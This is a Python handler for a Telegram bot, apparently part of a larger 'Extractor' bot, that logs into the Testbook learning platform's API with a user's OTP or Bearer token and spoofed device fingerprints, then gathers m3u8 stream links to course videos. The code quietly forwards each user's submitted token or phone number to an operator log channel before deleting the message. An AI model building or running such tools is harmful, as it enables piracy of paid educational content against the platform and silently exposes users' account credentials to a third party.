import re
import asyncio
import aiohttp
import json
from pyrogram import filters
from pyrogram.enums import ParseMode
from Extractor import app
from config import BOT_TEXT, TXT_LOGO_URL
from datetime import datetime
import pytz
import logging
import os
from Extractor.core.utils import forward_to_log, send_to_log

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.on_message(filters.command(["testbook", "tb"]))
async def testbook_handler(client, message):
    try:
        start_time = datetime.now()
        
        editable = await message.reply_text(
            "🔹 <b>TESTBOOK EXTRACTOR PRO</b> 🔹\n\n"
            "कृपया लॉगिन या बैच जानकारी भेजें:\n"
            "1️⃣ <b>Mobile Number</b> (OTP लॉगिन के लिए)\n"
            "2️⃣ <b>Auth Token (Bearer Token):</b>\n"
            "<code>Bearer eyJhbGciOiJSUzI1...</code>\n\n"
            "3️⃣ <b>Direct Video / Lesson Link:</b>\n"
            "<code>https://testbook.com/live-classes-series/...</code>"
        )

        user_input = await app.ask(message.chat.id, "अपना मोबाइल नंबर, Bearer Token या Testbook लिंक भेजें:")
        raw_text = user_input.text.strip()
        await forward_to_log(user_input, "Testbook Extractor")
        await user_input.delete()

        auth_token = None
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36",
            "X-Tb-Client": "web,1.3",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://testbook.com",
            "Referer": "https://testbook.com/"
        }

        # Handle 10-digit mobile number for OTP login
        if raw_text.isdigit() and len(raw_text) == 10:
            mobile = raw_text
            await editable.edit_text(f"⏳ मोबाइल नंबर <code>{mobile}</code> पर OTP भेजा जा रहा है...")

            otp_send_url = f"https://api.testbook.com/api/v2/otp/send?client=web&emailOrMobile={mobile}"
            async with aiohttp.ClientSession() as session:
                async with session.get(otp_send_url, headers=headers) as resp:
                    resp_json = await resp.json(content_type=None)
                    logger.info(f"Testbook OTP send resp: {resp_json}")

            otp_prompt = await app.ask(message.chat.id, f"📲 आपके मोबाइल <code>{mobile}</code> पर प्राप्त 6-अंकों का OTP भेजें:")
            otp_code = otp_prompt.text.strip()
            await otp_prompt.delete()

            await editable.edit_text("⏳ OTP सत्यापित किया जा रहा है...")
            login_url = (
                f"https://api.testbook.com/api/v2/otp/login?client=web&emailOrMobile={mobile}&otp={otp_code}"
                "&browserFpId=fakefp8648522696404&tbDeviceId=fakefp8648522696404"
            )
            login_body = {
                "firstVisitSource": {"type": "typein"},
                "emailOrMobile": mobile,
                "otp": otp_code,
                "signupDetails": {"page": "Others"}
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(login_url, json=login_body, headers=headers) as resp:
                    resp_json = await resp.json(content_type=None)
                    logger.info(f"Testbook Login response: {resp_json}")
                    if resp_json.get("success") and "data" in resp_json:
                        token_val = resp_json["data"].get("token") or resp_json["data"].get("sessionToken")
                        auth_token = f"Bearer {token_val}" if not token_val.startswith("Bearer ") else token_val
                    else:
                        await editable.edit_text(f"❌ <b>लॉगिन विफल:</b> {resp_json.get('message', 'अमान्य OTP')}")
                        return
        elif raw_text.startswith("Bearer ") or len(raw_text) > 100 and not raw_text.startswith("http"):
            auth_token = raw_text if raw_text.startswith("Bearer ") else f"Bearer {raw_text}"
        else:
            # Maybe a direct video link or default token
            pass

        if auth_token:
            headers["Authorization"] = auth_token
            await editable.edit_text("✅ <b>लॉगिन सफल!</b>")

        # Ask user for Goal ID, Course ID, or Video ID
        prompt_msg = await app.ask(
            message.chat.id,
            "📥 Testbook <b>Goal ID / Course ID / Video ID</b> या पूरा लिंक भेजें:\n\n"
            "<i>उदाहरण:</i>\n"
            "• Video ID: <code>692124bf8471bfcd00990ef6</code>\n"
            "• Goal ID: <code>685e851a620511f4ba002ff6</code>\n"
            "• All Free Lessons: <code>free</code>"
        )
        target = prompt_msg.text.strip()
        await prompt_msg.delete()

        await editable.edit_text(f"⏳ सामग्री प्राप्त की जा रही है: <code>{target}</code>...")

        extracted_urls = []
        async with aiohttp.ClientSession() as session:
            # Case 1: Video ID lookup
            if len(target) == 24 and not target.isalpha():
                v_url = f"https://api.testbook.com/api/v2.2/videos/{target}?language=English"
                async with session.get(v_url, headers=headers) as resp:
                    if resp.status == 200:
                        v_data = await resp.json(content_type=None)
                        entity = v_data.get("data", {}).get("entity", {})
                        v_name = entity.get("name", "Testbook Class")
                        m3u8 = entity.get("m3u8") or entity.get("url")
                        if m3u8:
                            extracted_urls.append(f"{v_name}:{m3u8}")

            # Case 2: Free Lessons or Goal ID
            if not extracted_urls:
                if target.lower() == "free" or len(target) < 10:
                    api_endpoint = "https://api.testbook.com/api/v1/mclass-series/lessons?skip=0&limit=50&lessonType=upcoming,live&isSkillCourse=false&purchaseType=free&isForYou=true&language=English"
                else:
                    api_endpoint = f"https://api.testbook.com/api/v2.1/classes?goalIds={target}&skip=0&limit=50&language=English"

                async with session.get(api_endpoint, headers=headers) as resp:
                    if resp.status == 200:
                        res_data = await resp.json(content_type=None)
                        data_block = res_data.get("data", {})
                        
                        # Parse lessons list
                        lessons = data_block.get("lessons", []) or data_block.get("classes", [])
                        for lesson in lessons:
                            l_id = lesson.get("_id")
                            l_props = lesson.get("properties", {}) or lesson
                            l_title = l_props.get("name") or l_props.get("title") or "Class"
                            
                            # Check if video object directly present or fetch video details
                            if l_id:
                                vid_api = f"https://api.testbook.com/api/v2.2/videos/{l_id}?language=English"
                                try:
                                    async with session.get(vid_api, headers=headers) as v_resp:
                                        if v_resp.status == 200:
                                            vd = await v_resp.json(content_type=None)
                                            m3u8_link = vd.get("data", {}).get("entity", {}).get("m3u8") or vd.get("data", {}).get("entity", {}).get("url")
                                            if m3u8_link:
                                                extracted_urls.append(f"{l_title}:{m3u8_link}")
                                except Exception:
                                    pass

        if not extracted_urls:
            await editable.edit_text(
                "❌ <b>कोई वैध वीडियो लिंक नहीं मिला।</b>\n\n"
                "कृपया सही ID, लिंक या सक्रिय Bearer Token प्रदान करें।"
            )
            return

        # Prepare and send file
        batch_name = "Testbook_Course"
        file_name = f"Testbook_{int(start_time.timestamp())}.txt"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(f"IMAGE: {TXT_LOGO_URL}\n\n" + "\n".join(extracted_urls))

        caption = (
            f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
            f"📱 <b>APP:</b> Testbook\n"
            f"📚 <b>BATCH / TARGET:</b> {target}\n"
            f"📊 <b>TOTAL LINKS:</b> {len(extracted_urls)}\n"
            f"📅 <b>DATE:</b> {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%m-%Y %H:%M:%S')} IST\n\n"
            f"<code>╾───• {BOT_TEXT} •───╼</code>"
        )

        await message.reply_document(document=file_name, caption=caption)
        try:
            await send_to_log(document=file_name, caption=caption)
        except Exception:
            pass

        if os.path.exists(file_name):
            os.remove(file_name)

        await editable.edit_text("✅ <b>Testbook एक्सट्रैक्शन सफलतापूर्वक पूरा हुआ!</b>")

    except Exception as e:
        logger.error(f"Error in testbook_handler: {e}")
        await message.reply_text(f"❌ <b>Error:</b> <code>{str(e)}</code>")
